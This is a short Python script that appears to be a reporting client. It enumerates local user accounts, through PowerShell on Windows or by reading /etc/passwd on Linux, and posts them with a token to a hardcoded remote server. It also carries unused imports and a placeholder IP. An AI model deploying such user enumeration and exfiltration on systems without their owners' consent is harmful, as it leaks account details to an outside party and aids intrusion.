from datetime import timedelta
from time import sleep
from urllib.parse import urlparse, unquote_plus
from cryptography.hazmat.primitives.asymmetric import rsa, padding
import sqlite3
from argon2 import PasswordHasher
import hashlib
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.exceptions import InvalidSignature
import requests
import os
import platform
import subprocess
import sys

def get_local_users():
    system_type = platform.system()

    try:
        if system_type == "Windows":
            result = subprocess.run(
                ["powershell.exe", "-c", "(get-localuser).name"],
                capture_output=True,
                text=True,
                shell=True
            )
            if result.returncode != 0:
                raise RuntimeError(result.stderr.strip())

            return result.stdout.splitlines()

        elif system_type == "Linux": 
            users = []
            with open("/etc/passwd", "r", encoding="utf-8") as f:
                for line in f:
                    parts = line.split(":")
                    if len(parts) > 2:
                        username = parts[0]
                        uid = int(parts[2])
                        if uid >= 1000:
                            users.append(username)
            return users

        else:
            raise NotImplementedError(f"Unsupported OS: {system_type}")

    except Exception as e:
        print(f"Error retrieving users: {e}", file=sys.stderr)
        return []
    

if __name__ == '__main__':
    local_ip_address = "1.1.1.1"

    data = {
        'ip_address': local_ip_address,
    }
    output = requests.post('https://129.21.108.33:443/register_client', data=data)
    token = output.text

    # get all local users on the system
    local_user_list = get_local_users()

    # while True:
    data = {
        'local_users': ','.join(local_user_list),
        'ip_address': local_ip_address,
        'authoriztion_token': output.text
    }
    requests.post('https://129.21.108.33:443/update_local_users', data=data)

    sleep(5)